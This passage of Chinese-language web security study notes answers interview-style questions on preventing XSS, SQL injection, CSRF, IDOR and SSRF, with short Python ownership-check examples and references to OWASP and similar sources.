- [ ] 使用最新稳定版本
- [ ] 软件物料清单(SBOM)已维护
```

---

## 面试要点

### Q1: XSS的三种类型及防御方法？

**答**:

**三种类型**：
1. **反射型XSS**：恶意脚本在URL中，需要诱导用户点击
2. **存储型XSS**：恶意脚本存储在服务器（数据库），影响所有访问者
3. **DOM型XSS**：通过JavaScript DOM操作触发，不经过服务器

**防御方法**：
1. **输出编码**：根据上下文（HTML/JS/CSS/URL）进行适当转义
2. **CSP**：Content Security Policy限制资源加载
3. **HttpOnly Cookie**：禁止JavaScript访问Cookie
4. **框架自动转义**：使用React/Vue等现代框架的自动转义

### Q2: SQL注入的原理和防御？

**答**:

**原理**：用户输入被拼接到SQL查询中，改变了查询的语义。

**防御**：
1. **参数化查询/预处理语句**：最有效的方法
2. **ORM使用**：使用Django ORM、SQLAlchemy等
3. **输入验证**：白名单验证输入类型
4. **最小权限**：数据库账号只授予必要权限
5. **WAF**：Web应用防火墙作为额外防线

### Q3: CSRF Token的工作原理？

**答**:

**原理**：
1. 服务器生成随机Token并存储在Session中
2. Token嵌入到表单或响应头中
3. 客户端提交时携带Token
4. 服务器验证Token与Session中的是否匹配

**为什么有效**：
- 同源策略阻止第三方网站读取目标网站的Token
- 攻击者无法预测Token值
- 即使诱导用户发送请求，也无法附带正确的Token

**补充措施**：
- SameSite Cookie属性
- 关键操作二次确认
- 验证Referer/Origin头

### Q4: OWASP Top 3漏洞是什么？

**答** (2021版):

1. **A01 - 失效的访问控制**：
   - 包括IDOR、越权访问
   - 用户能执行超出权限的操作

2. **A02 - 加密机制失效**：
   - 敏感数据保护不当
   - 使用过时的加密算法

3. **A03 - 注入**：
   - SQL注入、命令注入等
   - 不可信数据被解释为命令

### Q5: 如何防止IDOR攻击？

**答**:

**IDOR (Insecure Direct Object Reference)**：通过修改URL参数访问未授权资源。

**防御措施**：
1. **所有权验证**：查询时加入用户ID条件
   ```python
   order = Order.query.filter_by(id=order_id, user_id=current_user.id).first()
   ```

2. **间接引用映射**：使用UUID替代自增ID
   ```python
   order = Order.query.filter_by(uuid=order_uuid, user_id=current_user.id).first()
   ```

3. **集中授权检查**：使用装饰器或中间件统一检查
   ```python
   @require_ownership(Order)
   def get_order(order_id):
       return Order.query.get(order_id)
   ```

4. **避免可预测ID**：使用随机UUID

### Q6: SSRF的危害和防御？

**答**:

**危害**：
- 访问内网服务（数据库、管理接口）
- 读取本地文件
- 攻击云元数据服务（获取临时凭证）
- 进行端口扫描

**防御**：
1. **白名单**：只允许访问特定的域名/IP
2. **禁用危险协议**：file://, dict://, gopher://
3. **DNS解析双重检查**：解析域名后检查是否为内网IP
4. **网络隔离**：将外部请求服务部署在隔离网络
5. **统一代理**：通过受控代理服务器转发请求

---

## 相关概念

- [身份认证](./authentication.md)
- [授权与访问控制](./authorization.md)
- [Web安全](./web-security.md)
- [密码学基础](./cryptography.md)
- [安全开发生命周期](./sdlc.md)

---

## 参考资料

1. [OWASP Top 10 2021](https://owasp.org/Top10/)
2. [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
3. [CWE/SANS Top 25 Most Dangerous Software Errors](https://cwe.mitre.org/top25/)
4. [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
5. [PortSwigger Web Security Academy](https://portswigger.net/web-security)
6. [Google Application Security](https://www.google.com/about/appsecurity/)
7. [Mozilla Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)
8. [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
